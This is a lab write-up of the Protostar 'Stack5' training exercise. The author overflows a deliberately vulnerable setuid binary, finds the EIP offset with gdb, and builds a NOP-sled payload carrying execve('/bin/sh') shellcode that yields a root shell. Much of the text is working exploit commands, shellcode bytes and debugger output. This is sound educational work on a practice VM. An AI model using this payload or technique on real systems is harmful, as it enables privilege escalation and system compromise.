{{ Exploit Exercises: Protostar - 0x01 - Stack 5

    [~] {{ Exercise details

        Link : https://exploit-exercises.com/protostar/stack5/

        About:
        Stack5 is a standard buffer overflow, this time introducing shellcode.

        Hints:
            → At this point in time, it might be easier to use someone elses shellcode
            → If debugging the shellcode, use \xcc (int3) to stop the program executing and return to the debugger
            → remove the int3s once your shellcode is done.

    }}

    [x] {{ Solution

        # Inspect behavior when used as intended
        user@protostar:/opt/protostar/bin$ ./stack5
        fubar
        user@protostar:/opt/protostar/bin$

        # Create pattern
        > ./pattern.py -c 150
        Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9

        # Check behavior when overflowed
        user@protostar:/opt/protostar/bin$ ./stack5
        Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
        Segmentation fault

        # Load program into gdb and overflow again. Need a crash to find offset to EIP
        user@protostar:~$ echo Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9 > stack5
        user@protostar:/opt/protostar/bin$ gdb stack5 -q
        Reading symbols from /opt/protostar/bin/stack5...done.
        (gdb) r < ~/stack5
        Starting program: /opt/protostar/bin/stack5 < ~/stack5

        Program received signal SIGSEGV, Segmentation fault.
        0x63413563 in ?? ()

        # Calculate the offset
        > ./pattern.py -ol 63413563
        [+] Offset found at 76 bytes

        # Make a dummy payload to verify the offset and to find which memory addresses to overwrite EIP with
        user@protostar:~$ python -c 'print "\x90"*76 + "BBBB"' > stack5

        # Running program again to verify the offset. EIP should be 0x42424242 (BBBB)
        (gdb) r < ~/stack5
        The program being debugged has been started already.
        Start it from the beginning? (y or n) y
        Starting program: /opt/protostar/bin/stack5 < ~/stack5

        Program received signal SIGSEGV, Segmentation fault.
        0x42424242 in ?? ()
        (gdb) i r eip
        eip            0x42424242   0x42424242

        # Offset verified - time to have a look at the stack
        (gdb) x/80x $esp-150
        ....
        0xbffff76a: 0xda75bfff  0x9090b7ea  0x90909090  0x90909090
        0xbffff77a: 0x90909090  0x90909090  0x90909090  0x90909090
        0xbffff78a: 0x90909090  0x90909090  0x90909090  0x90909090
        0xbffff79a: 0x90909090  0x90909090  0x90909090  0x90909090
        0xbffff7aa: 0x90909090  0x90909090  0x90909090  0x90909090
        0xbffff7ba: 0x42429090  0x00004242  0xf8640000  0xf86cbfff
        ....

        # Nopsled found. Time to add shellcode etc to the payload
        # Reusing shellcode from previous exercises
        # Buffer (76 bytes) - Shellcode (24 bytes) = Nopsled (52 bytes)
        user@protostar:~$ python -c 'print "\x90"*52 + "\x83\xec\x7f\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x7a\xf7\xff\xbf"' > stack5

        # Running the program inside gdb again with the new payload
        (gdb) r < ~/stack5
        The program being debugged has been started already.
        Start it from the beginning? (y or n) y
        Starting program: /opt/protostar/bin/stack5 < ~/stack5
        Executing new program: /bin/dash

        Program exited normally.

        # Working - but no shell so I must try again outside of gdb with the keep shell alive trickery I learned earlier
        user@protostar:/opt/protostar/bin$ (cat ~/stack5; cat) | ./stack5
        whoami
        Illegal instruction

        # Trying next address
        user@protostar:/opt/protostar/bin$ (cat ~/stack5; cat) | ./stack5
        whoami
        Segmentation fault

        # Time to dump the core
        user@protostar:/opt/protostar/bin$ cp stack5 /tmp
        user@protostar:/opt/protostar/bin$ cd /tmp/
        user@protostar:/tmp$ (cat ~/stack5; cat) | ./stack5
        whoami
        Segmentation fault

        # Same as earlier. No core dump so executing the ulimit command again
        user@protostar:/tmp$ ulimit -c unlimited

        # Attempting to dump the core again
        user@protostar:/tmp$ (cat ~/stack5; cat) | ./stack5
        whoami
        Segmentation fault (core dumped)

        # Success - loading stack5 and the core dump into gdb
        user@protostar:/tmp$ gdb stack5 core.11.stack5.4267 -q
        Reading symbols from /tmp/stack5...done.

        warning: Can't read pathname for load map: Input/output error.
        Reading symbols from /lib/libc.so.6...Reading symbols from /usr/lib/debug/lib/libc-2.11.2.so...done.
        (no debugging symbols found)...done.
        Loaded symbols for /lib/libc.so.6
        Reading symbols from /lib/ld-linux.so.2...Reading symbols from /usr/lib/debug/lib/ld-2.11.2.so...done.
        (no debugging symbols found)...done.
        Loaded symbols for /lib/ld-linux.so.2
        Core was generated by `./stack5'.
        Program terminated with signal 11, Segmentation fault.
        #0  0xbd7fec46 in ?? ()

        # Having a look at the stack
        (gdb) x/80x $esp-150
        ....
        0xbffff7aa: 0xda75bfff  0x9090b7ea  0x90909090  0x90909090
        0xbffff7ba: 0x90909090  0x90909090  0x90909090  0x90909090
        0xbffff7ca: 0x90909090  0x90909090  0x90909090  0x90909090
        0xbffff7da: 0x90909090  0x90909090  0xec839090  0x580b6a7f
        ....

        # Updating the payload, returning to the original program and trying again
        user@protostar:/tmp$ cd /opt/protostar/bin/
        user@protostar:~$ python -c 'print "\x90"*52 + "\x83\xec\x7f\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\xba\xf7\xff\xbf"' > stack5
        user@protostar:/opt/protostar/bin$ (cat ~/stack5; cat) | ./stack5
        whoami
        root
        id
        uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)

    }}


    [~] {{ What did I learn?

        → \xcc is the opcode for INT3 instruction - use this to directly set breakpoints in the code
            → INT3 debugger trap instruction
            → stops the execution of the program and returns to the debugger
            → handy when debugging payload / shellcode

    }}

}}